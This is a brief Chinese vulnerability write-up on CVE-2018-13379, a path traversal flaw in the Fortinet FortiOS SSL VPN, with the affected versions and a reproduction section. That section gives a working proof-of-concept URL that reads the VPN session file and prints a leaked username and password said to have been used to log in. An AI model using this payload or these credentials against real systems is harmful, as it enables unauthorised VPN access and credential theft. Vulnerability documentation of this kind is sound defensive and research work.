---
title: （CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞
id: zhfly2945
---

# （CVE-2018-13379）Fortinet FortiOS 路径遍历漏洞

## 一、漏洞简介

Fortinet FortiOS路径遍历漏洞（CNNVD-201905-1026、CVE-2018-13379）
漏洞源于该系统未能正确地过滤资源或文件路径中的特殊元素，导致攻击者可以利用该漏洞访问受限目录以外的位置。Fortinet FortiOS 5.6.3版本至5.6.7版本、6.0.0版本至6.0.4版本中的SSL VPN 受此漏洞影响。

## 二、漏洞影响

Fortinet FortiOS 5.6.3版本至5.6.7版本、

Fortinet FortiOS 6.0.0版本至6.0.4版本

中的SSL VPN 受此漏洞影响。

## 三、复现过程

POC：`http://www.0-sec.org:4443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession`

![image](../img/0af0998ee7cfc90c78dddfc15f287c7f.png)

利用泄露的账户herschel/vvpn123成功登陆。

![image](../img/0acb41afe80dc17e71fae24332532238.png)

![image](../img/81e5e8b7ea2570e7a56380391472ac1c.png)

### 检测工具

> https://github.com/ianxtianxt/CVE-2018-13379

## 参考链接

> https://blog.csdn.net/limb0/article/details/102890683